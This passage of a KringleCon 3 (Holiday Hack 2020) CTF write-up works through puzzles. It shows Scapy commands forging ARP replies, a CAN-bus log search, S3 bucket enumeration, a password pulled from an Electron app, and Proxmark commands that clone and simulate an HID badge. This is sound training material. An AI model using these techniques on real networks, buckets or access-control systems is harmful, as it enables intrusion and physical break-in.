<ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=who-has hwsrc=00:16:ce:6e:8b:24 psrc=
192.168.0.114 hwdst=00:00:00:00:00:00 pdst=192.168.0.1 |>
```
```sh
>> ARP_PACKETS[1]
<Ether  dst=00:16:ce:6e:8b:24 src=00:13:46:0b:22:ba type=ARP |<ARP  hwtype=0x1 ptyp
e=IPv4 hwlen=6 plen=4 op=None hwsrc=ff:ff:ff:ff:ff:ff psrc=192.168.0.1 hwdst=ff:ff:
ff:ff:ff:ff pdst=192.168.0.114 |<Padding  load='\xc0\xa8\x00r' |>>>
>>> ARP_PACKETS[1][ARP]
<ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=None hwsrc=ff:ff:ff:ff:ff:ff psrc=192
.168.0.1 hwdst=ff:ff:ff:ff:ff:ff pdst=192.168.0.114 |<Padding  load='\xc0\xa8\x00r'
 |>>
>>> ARP_PACKETS[1][ARP].op = 2
>>> ARP_PACKETS[1][ARP]
<ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=ff:ff:ff:ff:ff:ff psrc=19
2.168.0.1 hwdst=ff:ff:ff:ff:ff:ff pdst=192.168.0.114 |<Padding  load='\xc0\xa8\x00r
' |>>
>>> ARP_PACKETS[1][ARP].hwdst = '00:16:ce:6e:8b:24'
>>> ARP_PACKETS[1][ARP]
<ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=ff:ff:ff:ff:ff:ff psrc=19
2.168.0.1 hwdst=00:16:ce:6e:8b:24 pdst=192.168.0.114 |<Padding  load='\xc0\xa8\x00r
' |>>
```


#### FRoot - Netwars Room - CAN-Bus Investigation

```txt
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMWX00OkxxddcddxxkOO0XWMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMWXOxoc:c.;cccccc.ccccc:.:c:ldxOXMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMXkoc',ccccc:.:ccccc.ccccc.;cccc,'::cdOXMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMM0xc:cccc,':cccc::ccccccccccccccc:.;cccccc:lxXMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMNkl,',:ccccc;;ccccccccccccccccccccc::cccccc:,',:lOWMMMMMMMMMMMMM
MMMMMMMMMMMMNxccccc;';cccccccccccccccccccccccccccccccccc;':cccccckWMMMMMMMMMMM
MMMMMMMMMMNdcccccc:..;cccccccccccccccccccccccccccccccccccccccccccc:kWMMMMMMMMM
MMMMMMMMM0c,,,,:cccc;..;cccccccccccccccccccccccccccccccccccccc:,,,;:lKMMMMMMMM
MMMMMMMWd:cccc;:cccccc;..,cccccccccccccccccccccccccccccccccccc;:cccccckMMMMMMM
MMMMMMNlcccccccccccccccc:..,:ccccccccccccccccccccccccccccccccccccccccc:oWMMMMM
MMMMMNc,,,,,:ccccccccccccc:..':cccccccccccccccccccccccccccccccccc:,,,,,;oWMMMM
MMMMWoccccc::ccccccccccccccc:'.':cccccccccccccccccccccccccccccccc::ccccccxMMMM
MMMMkccccccccccccccccccccccccc:'..:cccccccccccccccccccccccccccccccccccccc:0MMM
MMMN::cccccccccccccccccccccccccc:'..:cccccccccccccccccccccccccccccccccccc:cWMM
MMMk,,,,,:cccccccccccccccccccccccc:,..;ccccccccccccccccccccccccccccc:,,,,,;0MM
MMMlccccccccccccccccccccccccccccccccc,.;cccccccccccccccccccccccccccccccccccdMM
MMW:ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccclMM
MMWOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0MM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
```
Welcome to the CAN bus terminal challenge!

In your home folder, there's a CAN bus capture from Santa's sleigh. Some of
the data has been cleaned up, so don't worry - it isn't too noisy. What you
will see is a record of the engine idling up and down. Also in the data are
a LOCK signal, an UNLOCK signal, and one more LOCK. Can you find the UNLOCK?
We'd like to encode another key mechanism.

Find the decimal portion of the timestamp of the UNLOCK code in candump.log
and submit it to ./runtoanswer!  (e.g., if the timestamp is 123456.112233,
please submit 112233)

#### Solution

So the objective here is to find the unlock inside the 
```candump.log``` file. The application ```candump``` is used to dump 
CAN (Controller Area Network) traffic from the CAN interface it's 
sniffing from. In this case, the deliverable is second part of 
timestamp of the unlock code sent to the CAN bus.

```sh
elf@7d5eb44417d6:~$ ls
candump.log  runtoanswer
```

I have never seen CAN Bus traffic in my life. Took a look at it for the 
first time and didn't know what to do with my hands. Used head to look 
at the first 50 CAN codes from the ```candump.log```. Yes, this is new. 
This is good.

```sh
elf@ed2cf453eaf7:~$ head -50 candump.log 
(1608926660.800530) vcan0 244#0000000116
(1608926660.812774) vcan0 244#00000001D3
(1608926660.826327) vcan0 244#00000001A6
(1608926660.839338) vcan0 244#00000001A3
(1608926660.852786) vcan0 244#00000001B4
(1608926660.866754) vcan0 244#000000018E
(1608926660.879825) vcan0 244#000000015F
(1608926660.892934) vcan0 244#0000000103
(1608926660.904816) vcan0 244#0000000181
(1608926660.920799) vcan0 244#000000015F
(1608926660.934338) vcan0 244#0000000173
(1608926660.946952) vcan0 244#0000000183
(1608926660.962926) vcan0 244#0000000149
(1608926660.970738) vcan0 188#00000000
(1608926660.977487) vcan0 244#00000001E0
(1608926660.989792) vcan0 244#00000001D6
(1608926661.002690) vcan0 244#0000000145
(1608926661.018189) vcan0 244#00000001E9
(1608926661.031261) vcan0 244#00000001F9
(1608926661.042719) vcan0 244#0000000185
(1608926661.053863) vcan0 244#00000001AB
(1608926661.066551) vcan0 244#00000001E0
(1608926661.079120) vcan0 244#0000000157
(1608926661.092179) vcan0 244#00000001BD
(1608926661.105503) vcan0 244#0000000188
(1608926661.120710) vcan0 244#0000000189
(1608926661.133553) vcan0 244#00000001C0
(1608926661.145725) vcan0 244#000000019E
(1608926661.158666) vcan0 244#00000001E3
(1608926661.173070) vcan0 244#0000000123
(1608926661.184569) vcan0 244#00000001FC
(1608926661.195901) vcan0 244#00000001C0
(1608926661.209364) vcan0 244#0000000155
(1608926661.220631) vcan0 244#00000001EB
(1608926661.233510) vcan0 244#0000000182
(1608926661.245964) vcan0 244#0000000195
(1608926661.258201) vcan0 244#000000013B
(1608926661.271293) vcan0 244#000000012B
(1608926661.285172) vcan0 244#0000000191
(1608926661.297488) vcan0 244#000000015A
(1608926661.309332) vcan0 244#0000000148
(1608926661.322653) vcan0 244#000000018E
(1608926661.336724) vcan0 244#00000001EA
(1608926661.348576) vcan0 244#00000001E7
(1608926661.361548) vcan0 244#0000000174
(1608926661.373583) vcan0 244#0000000167
(1608926661.385352) vcan0 244#0000000159
(1608926661.400643) vcan0 244#00000001D5
(1608926661.413712) vcan0 244#00000001ED
(1608926661.426704) vcan0 244#000000016F
```

So, I utilized pattern recognition to find the code. In the description 
they say they locked, unlocked, and locked the car. That would assume
I'm looking for two different codes one occuring twice and the other
once. Possibly in succession. 

Found one code that caught my eye. Shown below.

```sh
(1608926664.626448) vcan0 19B#000000000000
```

Decided to grep through the output for the string 19B#. It provided the
exact pattern that I needed. One code to lock, one code to unlock,
another code to lock.

```sh
elf@7d5eb44417d6:~$ cat candump.log | grep -i 19b#
(1608926664.626448) vcan0 19B#000000000000
(1608926671.122520) vcan0 19B#00000F000000
(1608926674.092148) vcan0 19B#000000000000
```

Ran the time portion of the timestamp through ```runtoanswer``` and it
looks like it worked. Suppose a playback of the code would be in order
to unlock the virtual car.

```sh
elf@7d5eb44417d6:~$ ./runtoanswer 122520
Your answer: 122520
Checking....
Your answer is correct!
```

### Challenges

#### F1 - Dining Room - The Elf Code

Mischevious munchkins have nabbed all the North Pole's lollipops intended for good children all over the world.

Use your JavaScript skills to retrieve the nabbed lollipops from all the entrances of KringleCon.

Click to begin at [KringleCon entrance #1](https://elfcode.kringlecastle.com/?challenge=elfcode&id=c9dceab7-fb83-45df-b1b0-6938ca0e9874&username=n3s0&area=diningroom&location=4,1&tokens=#) or [continue at your current task](https://elfcode.kringlecastle.com/?challenge=elfcode&id=c9dceab7-fb83-45df-b1b0-6938ca0e9874&username=n3s0&area=diningroom&location=4,1&tokens=#).

Not familiar with JavaScript?

The following is a brief but helpful tutorial on JavaScript:

[JavaScript in 14 minutes - by Jeremy Thomas](https://jgthms.com/javascript-in-14-minutes/)



#### F1 - Kitchen - 33.6kbps

##### Solution

756-8347

1. beDURRdunditty
2. SCHHRRHHRTHRTR
3. aaah
4. baaDEEbrrr
5. WEWEWwrwrrwrr

Dial number + 4 + 3 + 5 + 1 + 2


#### F1.5 - Workshop - Sort-o-Matic


About

The SORT-O-MATIC is responsible for separating properly wrapped presents from disfunctional misfit presents. Properly wrapped presents are put into Santa's gift bag while the misfit toys are dropped into a box with a portal to the Island of Misfit Toys.

The SORT-O-MATIC's configuration works using regular expressions. When all eight regular expressions match the desired values the SORT-O-MATIC will properly sort presents.
Troubleshooting

If the SORT-O-MATIC is NOT sorting presents at 100% accuracy, you will need to add the desired regex in the invalid (red-highlighted) inputs and then click the corresponding toggle switch. If you provide the correct regular expression and toggle the switch, the input will turn green and the progress bar will grow. You must reach 100% accuracy in order to fix the SORT-O-MATIC.

Click on the description above each input to display a message with more details about the desired regular expression.

Click the HELP button on the SORT-O-MATIC to view this help manual again.

##### Solution

1. Create a Regex That Matches All Digits

Create a regular expression that will only match any string containing at least one digit.

```
\d
```

2. Create a Regex That Matches 3 or More Alpha Characters Ignoring Case

Create a regular expression that will only match only alpha characters A-Z of at least 3 characters in length or greater while ignoring case.

```
[a-zA-Z]{3}
```

3. Create a Regex That Matches Two Consecutive Lowercase a-z or numeric characters.

Create a regular expression that will only match at least two consecutive lowercase a-z or numeric characters.

```
[a-z|1-9]{2}
```

4. Any two characters that are not uppercase A-L or 1-5

Create a regular expression that will only match any two characters that are NOT uppercase A through L and NOT numbers 1 through 5.

```
[^A-L1-5]{2}
```

5. Create a Regex To Match a String of 3 Characters in Length or More Composed of ONLY Digits

Create a regular expression that only matches if the entire string is composed of entirely digits and is at least 3 characters in length.



6. Create A Regex To Match Multiple Hour:Minute:Second Time Formats Only

Create a regular expression that only matches if the entire string is a valid Hour, Minute and Seconds time format similar to the following:

12:24:53
1:05:24
23:02:43
08:04:10

However, the following would be invalid:

25:30:86
A1:E4:B5
B2:13:4A
32:24:53
08:74:53
12:5:24

Use anchors or boundary markers to avoid matching other surrounding strings.

7. Create A Regular Expression That Matches The MAC Address Format Only While Ignoring Case

Create a regular expression that only matches if the entire string is a MAC address. For example:

00:0a:95:9d:68:16
76:A4:5A:D2:69:93
B8:13:13:D1:18:EC
95:ce:00:4a:22:df

However, the following would be examples of invalid MAC Addresses:
97:z2:gf:c4:02:c2
de:140:130:69:7_-bd
C0:HH:EE:50:B7:C3

Use anchors or boundary markers to avoid matching other surrounding strings.

8. Create A Regex That Matches Multiple Day, Month, and Year Date Formats Only

Create a regular expression that only matches one of the three following day, month, and four digit year formats:

10/01/1978
01.10.1987
14-12-1991

However, the following values would be invalid formats:
05/25/89
12-32-1989
01.1.1989
1/1/1

Use anchors or boundary markers to avoid matching other surrounding strings.


### Objectives

Below are the objectives (answered/unanswered) for KringleCon 3.

#### 1. Uncover Santa's Gift List

There is a photo of Santa's Desk on that billboard with his personal gift list. What gift is Santa planning on getting Josh Wright for the holidays? Talk to Jingle Ringford at the bottom of the mountain for advice.

###### Answer

This is among the few that I will provide the solution within the answer. So, to find the answer I needed to do the following.

1. Download the image of the billboard at the bottom of the hill.
  - ```wget https://2020.kringlecon.com/textures/billboard.png```
2. Upload it to Photopea.
3. Select an area around the distorted lettering with the lasso.
4. Select ```Filter``` > ```Distort``` > ```Twirl```
5. Twirl the lettering about 360 degrees.
6. Below are the listings found: (Not in order)
  - Ed - Two Front Teeth
  - -an - OU Jersey (Unable to see the name.)
  - Jeremy - Blanket
  - Brian - Lei
  - Josh Wright - proxmark
  - Clay - Darth Vader Suit
  - Tad - Holiday Lights
  - Phil - Stuffed pikachu
  - Jerry - Trip to North Pole

Below is the answer to this objective:

- Answer: ```proxmark```

#### 2. Investigate S3 Bucket

When you unwrap the over-wrapped file, what text string is inside the package? Talk to Shinny Upatree in front of the castle for hints on this challenge.

##### Answer

Below is the answer to this objective. Please read ```Challenge - Investigate S3 Bucket``` in the ```Floor 1 - Front Lawn``` section for more detail on how the answer was discovered.

- Answer: ```North Pole: The Frostiest Place on Earth```

### Solution

Looks like a lot of the hints for this are provided by Shinny Upatree. Below are some of the links that are provided for reference.

- [Bucket Finder](https://digi.ninja/projects/bucket_finder.php)
- [What's in Amazon buckets?](https://digi.ninja/blog/whats_in_amazons_buckets.php)
- [Josh Wright, Open S3 Buckets: Still a Problem In 2020 | KringleCon 2020](https://www.youtube.com/watch?v=t4UzXx5JHk0)

Below is the Investigate S3 Bucket challenges inital terminal prompt/motd.

Can you help me? Santa has been experimenting with new wrapping technology, and
we've run into a ribbon-curling nightmare!
We store our essential data assets in the cloud, and what a joy it's been!
Except I don't remember where, and the Wrapper3000 is on the fritz!
Can you find the missing package, and unwrap it all the way?
Hints: Use the file command to identify a file type. You can also examine
tool help using the man command. Search all man pages for a string such as
a file extension using the apropos command.
To see this help again, run cat /etc/motd.

Below are the tips from the ```TIPS``` file regarding the terminal.

```md
elf@dc0a7544ae94:~$ cat TIPS 
# TIPS
- If you need an editor to create a file you can run nano (vim is also
  available).
- Everything you need to solve this challenge is provided in this terminal
  session.
```

Looks like the wordlist found in the path ```~/bucket_finder/wordlist``` has only three words and they can be found below.

```txt
elf@dc0a7544ae94:~/bucket_finder$ cat wordlist 
kringlecastle
wrapper
santa
```

Below is the help/usage for bucket_finder.

```sh
elf@dc0a7544ae94:~/bucket_finder$ ./bucket_finder.rb --help
bucket_finder 1.0 Robin Wood (robin@digininja.org) (www.digininja.org)
Usage: bucket_finder [OPTION] ... wordlist
        --help, -h: show help
        --download, -d: download the files
        --log-file, -l: filename to log output to
        --region, -r: the region to use, options are:
                                        us - US Standard
                                        ie - Ireland
                                        nc - Northern California
                                        si - Singapore
                                        to - Tokyo
        -v: verbose
        wordlist: the wordlist to use
```

I searched through the available regions found in the usage. Looks like none of them provide fruitful results. However, they do show one bucket that would require credentials to access named ```santa``` on all of the available regions.

Note: Command looked like ```./bucket_finder.rb -d -r us wordlist``` or similar. Iterated through all of the available regions like I state above.

```sh
http://s3.amazonaws.com/kringlecastle
Bucket found but access denied: kringlecastle
http://s3.amazonaws.com/wrapper
Bucket found but access denied: wrapper
http://s3.amazonaws.com/santa
Bucket santa redirects to: santa.s3.amazonaws.com
http://santa.s3.amazonaws.com/
        Bucket found but access denied: santa
http://s3-eu-west-1.amazonaws.com/kringlecastle
Bucket kringlecastle redirects to: s3.amazonaws.com
http://s3.amazonaws.com/
http://s3-eu-west-1.amazonaws.com/wrapper
Bucket wrapper redirects to: s3.amazonaws.com
http://s3.amazonaws.com/
http://s3-eu-west-1.amazonaws.com/santa
Bucket santa redirects to: santa.s3-us-west-1.amazonaws.com
http://santa.s3-us-west-1.amazonaws.com/
        Bucket found but access denied: santa
http://s3-us-west-1.amazonaws.com/kringlecastle
Bucket kringlecastle redirects to: s3.amazonaws.com
http://s3.amazonaws.com/
http://s3-us-west-1.amazonaws.com/wrapper
Bucket wrapper redirects to: s3.amazonaws.com
http://s3.amazonaws.com/
http://s3-us-west-1.amazonaws.com/santa
Bucket found but access denied: santa
http://s3-ap-southeast-1.amazonaws.com/kringlecastle
Bucket kringlecastle redirects to: s3.amazonaws.com
http://s3.amazonaws.com/
http://s3-ap-southeast-1.amazonaws.com/wrapper
Bucket wrapper redirects to: s3.amazonaws.com
http://s3.amazonaws.com/
http://s3-ap-southeast-1.amazonaws.com/santa
Bucket santa redirects to: santa.s3-us-west-1.amazonaws.com
http://santa.s3-us-west-1.amazonaws.com/
        Bucket found but access denied: santa
http://s3-ap-northeast-1.amazonaws.com/kringlecastle
Bucket kringlecastle redirects to: s3.amazonaws.com
http://s3.amazonaws.com/
http://s3-ap-northeast-1.amazonaws.com/wrapper
Bucket wrapper redirects to: s3.amazonaws.com
http://s3.amazonaws.com/
http://s3-ap-northeast-1.amazonaws.com/santa
Bucket santa redirects to: santa.s3-us-west-1.amazonaws.com
http://santa.s3-us-west-1.amazonaws.com/
        Bucket found but access denied: santa
```

Added wrapper3000 to the wordlist as it was shown in the motd. So, I thought it was a clue. After appending it and using the command shown in the output, it shows bucket where credentials aren't required to access the data stored on it. This downloads a file named ```package```. This must be what I need to work with.

```sh
elf@dc0a7544ae94:~/bucket_finder$ ./bucket_finder.rb -d -r us wordlist 
http://s3.amazonaws.com/kringlecastle
Bucket found but access denied: kringlecastle
http://s3.amazonaws.com/wrapper
Bucket found but access denied: wrapper
http://s3.amazonaws.com/santa
Bucket santa redirects to: santa.s3.amazonaws.com
http://santa.s3.amazonaws.com/
        Bucket found but access denied: santa
http://s3.amazonaws.com/wrapper3000
Bucket Found: wrapper3000 ( http://s3.amazonaws.com/wrapper3000 )
        <Downloaded> http://s3.amazonaws.com/wrapper3000/package
```

Looks like the package file downloaded is an ASCII text file based on the output below. That's not very helpful. Perhaps it provides more data.

```sh
elf@dc0a7544ae94:~/bucket_finder/wrapper3000$ file package 
package: ASCII text, with very long lines
```

Interesting. It looks like the output of the file contains Base64 within the text. This is going to be a fun one! I don't think I've ever unwrapped a file in this manner.

```sh
elf@dc0a7544ae94:~/bucket_finder/wrapper3000$ cat package 
UEsDBAoAAAAAAIAwhFEbRT8anwEAAJ8BAAAcABwAcGFja2FnZS50eHQuWi54ei54eGQudGFyLmJ6MlVUCQA
DoBfKX6AXyl91eAsAAQT2AQAABBQAAABCWmg5MUFZJlNZ2ktivwABHv+Q3hASgGSn//AvBxDwf/xe0gQAAA
gwAVmkYRTKe1PVM9U0ekMg2poAAAGgPUPUGqehhCMSgaBoAD1NNAAAAyEmJpR5QGg0bSPU/VA0eo9IaHqBk
xw2YZK2NUASOegDIzwMXMHBCFACgIEvQ2Jrg8V50tDjh61Pt3Q8CmgpFFunc1Ipui+SqsYB04M/gWKKc0Vs
2DXkzeJmiktINqjo3JjKAA4dLgLtPN15oADLe80tnfLGXhIWaJMiEeSX992uxodRJ6EAzIFzqSbWtnNqCTE
DML9AK7HHSzyyBYKwCFBVJh17T636a6YgyjX0eE0IsCbjcBkRPgkKz6q0okb1sWicMaky2Mgsqw2nUm5ayP
HUeIktnBIvkiUWxYEiRs5nFOM8MTk8SitV7lcxOKst2QedSxZ851ceDQexsLsJ3C89Z/gQ6Xn6KBKqFsKyT
kaqO+1FgmImtHKoJkMctd2B9JkcwvMr+hWIEcIQjAZGhSKYNPxHJFqJ3t32Vjgn/OGdQJiIHv4u5IpwoSG0
lsV+UEsBAh4DCgAAAAAAgDCEURtFPxqfAQAAnwEAABwAGAAAAAAAAAAAAKSBAAAAAHBhY2thZ2UudHh0Llo
ueHoueHhkLnRhci5iejJVVAUAA6AXyl91eAsAAQT2AQAABBQAAABQSwUGAAAAAAEAAQBiAAAA9QEAAAAA
```

So, I decided to take a quick look at what the encoded data could show me. I used cat to read the file and pipped it into the base64 command with the decode flag. This outputted that the file's name is ```package.txt.Z.xz.xxd.tar.bz2```. So, this means the following.

1. File was compressed.
2. Compressed again using the xz command.
3. The hex of the xz file was dumped into xxd file.
4. Compressed again using tar.
5. Comressed again using bz2.

Fun. Let's get to work. If you're asking, "Why?". Well, I think the intention here is to show us that obfuscation is still a thing. This is where people make something so obscure or unclear that no one wants to touch it. That's enough though. Time to move forward with this.

```sh
elf@dc0a7544ae94:~/bucket_finder/wrapper3000$ cat package | base64 -d
PK
??��   package.txt.Z.xz.xxd.tar.bz2UT  ��_��_ux
                                                   �BZh91AY&SY�Kb�����d���/
� �^0Y�a�{S�3�4zC ښ  �=C�?���#��h=M4!&&�y@h4m#��P4z�Hhz��6a��5@9�#<
                                                                          \�P��/Cbk
��y��㇭O�t<
h)[�sR)�/���Ӄ?�b�sEl�5���f�KH6��ܘ�  .�<�y��{�-���^h�"  ��ݮƇQ'�́s�&ֶsj   10�@+��K<�
�PU&{O��k� �5�xM�&�p >
���Z���x�/=g��y�(�²NF�;�E�b&�r�&C�݁���+��      ��F�"�4�G$Z����V8'��@���.�p�!���~PK
??��  ?��package.txt.Z.xz.xxd.tar.bz2UT��_ux
                                               �PKb�
```

To make that file the original ```package.txt.Z.xz.xxd.tar.bz2``` I needed to create the file and append the decoded data using the ```cat package | base64 -d > package.txt.Z.xz.xxd.tar.bz2``` command.

With this, I can inspect the file to verify that I didn't miss something. Looks like it's actually a zip file right now. So I used the ```unzip``` command to unzip the file and it extracted.


```sh
elf@dc0a7544ae94:~/bucket_finder/wrapper3000$ file package.txt.Z.xz.xxd.tar.bz2 
package.txt.Z.xz.xxd.tar.bz2: Zip archive data, at least v1.0 to extract
elf@dc0a7544ae94:~/bucket_finder/wrapper3000$ unzip package.txt.Z.xz.xxd.tar.bz2 
Archive:  package.txt.Z.xz.xxd.tar.bz2
replace package.txt.Z.xz.xxd.tar.bz2? [y]es, [n]o, [A]ll, [N]one, [r]ename: y
 extracting: package.txt.Z.xz.xxd.tar.bz2 
```

Verified that this is now the file compressed with bzip2 file the file command and it looks like it is. Extracted the tar file using the bzip2 command with the decomress flag.

```sh
elf@9b7954a38d40:~/bucket_finder/wrapper3000$ file package.txt.Z.xz.xxd.tar.bz2 
package.txt.Z.xz.xxd.tar.bz2: bzip2 compressed data, block size = 900k
elf@9b7954a38d40:~/bucket_finder/wrapper3000$ bzip2 -d package.txt.Z.xz.xxd.tar.bz2
```

Varified again that the file is a tar file and extracted the xxd file using the tar command and the ```-xf``` flags.

```sh
elf@9b7954a38d40:~/bucket_finder/wrapper3000$ file package.txt.Z.xz.xxd.tar    
package.txt.Z.xz.xxd.tar: POSIX tar archive
elf@dc0a7544ae94:~/bucket_finder/wrapper3000$ tar -xf package.txt.Z.xz.xxd.tar 
```

Checked the xxd file with the file command and it shows that it's an ASCII file. Makes sense for a hex dump to be shown in ASCII. Verified that it the file was compressed with ```xz``` by looking up the file header. An xz file will normally have ```FD 37 7A 58 5A 00``` in their header. Looks like this is the case with this one. Time to continue.

```sh
elf@dc0a7544ae94:~/bucket_finder/wrapper3000$ file package.txt.Z.xz.xxd
package.txt.Z.xz.xxd: ASCII text
elf@dc0a7544ae94:~/bucket_finder/wrapper3000$ cat package.txt.Z.xz.xxd
00000000: fd37 7a58 5a00 0004 e6d6 b446 0200 2101  .7zXZ......F..!.
00000010: 1600 0000 742f e5a3 0100 2c1f 9d90 4ede  ....t/....,...N.
00000020: c8a1 8306 0494 376c cae8 0041 054d 1910  ......7l...A.M..
00000030: 46e4 bc99 4327 4d19 8a06 d984 19f3 f08d  F...C'M.........
00000040: 1b10 45c2 0c44 a300 0000 0000 c929 dad6  ..E..D.......)..
00000050: 64ef da24 0001 452d 1e52 57e8 1fb6 f37d  d..$..E-.RW....}
00000060: 0100 0000 0004 595a                      ......YZ
```

Used the ```xxd``` command with the ```-r``` or reverse option to convert the the hexdump to binary.

```sh
elf@dc0a7544ae94:~/bucket_finder/wrapper3000$ xxd -r package.txt.Z.xz.xxd package.txt.Z.xz
```

Checked the file's magic bits to verify that it's an XZ file. Confirmation that it is allowed me to continue to decomress the file with the ```xz``` command with the ```-d``` flag.

```sh
elf@dc0a7544ae94:~/bucket_finder/wrapper3000$ file package.txt.Z.xz
package.txt.Z.xz: XZ compressed data
elf@dc0a7544ae94:~/bucket_finder/wrapper3000$ xz -d package.txt.Z.xz
```

Checked the file again and it looks like this file just says it's compressed data. I haven't seen the ```.Z``` file extension personally. But, a quick search on the Internet shows that this is an extention used by the ```compress``` command. So, I used its counter part ```uncompress``` to uncompress the file to ```package.txt```.

```sh
elf@dc0a7544ae94:~/bucket_finder/wrapper3000$ file package.txt.Z
package.txt.Z: compress'd data 16 bits
elf@dc0a7544ae94:~/bucket_finder/wrapper3000$ uncompress package.txt.Z
```

Finally verfied that the file was indeed a text file using the ```file``` command. Read the file using the ```cat``` command and it outputted ```orth Pole: The Frostiest Place on Earth```.

```sh
elf@9b7954a38d40:~/bucket_finder/wrapper3000$ file package.txt
package.txt: ASCII text
elf@dc0a7544ae94:~/bucket_finder/wrapper3000$ cat package.txt
North Pole: The Frostiest Place on Earth
```

Looks like we've found the answer to this challenge. Answer to the question ```2. Investigate S3 Bucket``` can be found below.

- Answer: North Pole: The Frostiest Place on Earth

### 3. Point-of-Sale Password Recovery

Help Sugarplum Mary in the Courtyard find the supervisor password for the point-of-sale terminal. What's the password?

#### Answer

This can be found by looking for the supervisor password in the point-of-sale application. The solution with more detail can be found above by reading ```Challenge - Santas Shop``` in the ```Floor 1 - Courtyard``` section. Answer can be found below.

- Answer: ```santapass```

### Solution

Below is the output from the Santa Shop POS system.

Looks like the terminal is locked out!

[Download offline version to inspect](https://download.holidayhackchallenge.com/2020/santa-shop/santa-shop.exe)

For more information, talk to Sugarplum Mary! She's probably nearby.

```sh
timothyl@neptune:~/.wine/drive_c$ find . | grep -i asar
./users/timothyl/Local Settings/Application Data/Programs/santa-shop/resources/app.asar
```
```sh
timothyl@neptune:~/.wine/drive_c/users/timothyl/Local Settings/Application Data/Programs/santa-shop/resources$ asar --help
Usage: asar [options] [command]

Manipulate asar archive files

Options:
  -V, --version                         output the version number
  -h, --help                            display help for command

Commands:
  pack|p [options] <dir> <output>       create asar archive
  list|l [options] <archive>            list files of asar archive
  extract-file|ef <archive> <filename>  extract one file from archive
  extract|e <archive> <dest>            extract archive
  *
  help [command]                        display help for command
```

```sh
timothyl@neptune:~/.wine/drive_c/users/timothyl/Local Settings/Application Data/Programs/santa-shop/resources$ asar extract app.asar santa_shop/
```

```sh
timothyl@neptune:~/.wine/drive_c/users/timothyl/Local Settings/Application Data/Programs/santa-shop/resources/santa_shop$ ls -la
total 44
drwxrwxr-x 3 timothyl timothyl 4096 Jan  2 02:09 .
drwxrwxr-x 3 timothyl timothyl 4096 Jan  2 02:07 ..
drwxrwxr-x 2 timothyl timothyl 4096 Jan  2 02:09 img
-rw-rw-r-- 1 timothyl timothyl 1284 Jan  2 02:09 index.html
-rw-rw-r-- 1 timothyl timothyl 2713 Jan  2 02:09 main.js
-rw-rw-r-- 1 timothyl timothyl  202 Jan  2 02:09 package.json
-rw-rw-r-- 1 timothyl timothyl  138 Jan  2 02:09 preload.js
-rw-rw-r-- 1 timothyl timothyl   79 Jan  2 02:09 README.md
-rw-rw-r-- 1 timothyl timothyl 5984 Jan  2 02:09 renderer.js
-rw-rw-r-- 1 timothyl timothyl 3801 Jan  2 02:09 style.css
```

```sh
timothyl@neptune:~/.wine/drive_c/users/timothyl/Local Settings/Application Data/Programs/santa-shop/resources/santa_shop$ grep -i password main.js
const SANTA_PASSWORD = 'santapass';
ipcMain.handle('unlock', (event, password) => {
  return (password === SANTA_PASSWORD);
```

```sh
timothyl@neptune:~/.wine/drive_c/users/timothyl/Local Settings/Application Data/Programs/santa-shop/resources/santa_shop$ cat README.md 
Remember, if you need to change Santa's passwords, it's at the top of main.js!
```

The answer for this challenge is ```santapass```. This answers the question named ```3. Point-of-Sale Password Recovery```.

### 4. Operate the Santavator

Talk to Pepper Minstix in the entryway to get some hints about the Santavator.

#### Answer

This objective is more about action than it is about answering a question. Explaination for the completed Objective can be found in ```Challenge - Santavator``` in the ```Floor 1 - Entryway``` section.

#### Solution

Picking up a few items throughout the North Pole and utilizing them to direct the streams will assist with this challenge. Main components that I've used are the bolts and the Red, Green, and Yellow light bulbs found through out the castle. Just using the Santavator using these items will solve the Objective ```4. Operate the Santavator```.

- The solution is to collect the lightbulbs and utilize the elevator key to access the elevator panel. 
- Then you use the items collected throughout the castle to direct the S4 stream to the holes. 
- The light bulbs need to be in the path of the circuit of it's designated color to light the proper panel light. Otherwise it wont light up.
- I haven't yet figured out how to bypass the finger print scanner.

Based on some information from Sparkle Redberry you can bypass the need for the Super Santavator Sparkle Stream (S4) entirely if you can find a certain item.

### 5. Open HID Lock

Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks for hints on this challenge. You may also visit Fitzy Shortstack in the kitchen for tips.

#### Solution

Shinny Upatree

```
magicdust] pm3 --> lf hid read
#db# TAG ID: 2006e22f13 (6025) - Format Len: 26 bit - FC: 113 - Card: 6025
```

```
[magicdust] pm3 --> lf hid sim -r 2006e22f13
[=] Simulating HID tag using raw 2006e22f13
[=] Stopping simulation after 10 seconds.
[=] Done
```

Door has opened.

### 6. Splunk Challenge

Access the Splunk terminal in the Great Room. What is the name of the adversary group that Santa feared would attack KringleCon?

### 7. Solve the Sleigh's CAN-D-BUS Problem

Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. We need you to exclude the malicious messages and no others to fix the sleigh. Visit the NetWars room on the roof and talk to Wunorse Openslae for hints.

### 8. Broken Tag Generator

Help Noel Boetie fix the [Tag Generator](https://tag-generator.kringlecastle.com/) in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this.

### 9. ARP Shennanigans

Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at ```/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt```. Who recused herself from the vote described on the document?

### 10. Defeat Fingerprint Scanner

Bypass the Santavator fingerprint sensor. Enter Santa's office without Santa's fingerprint.

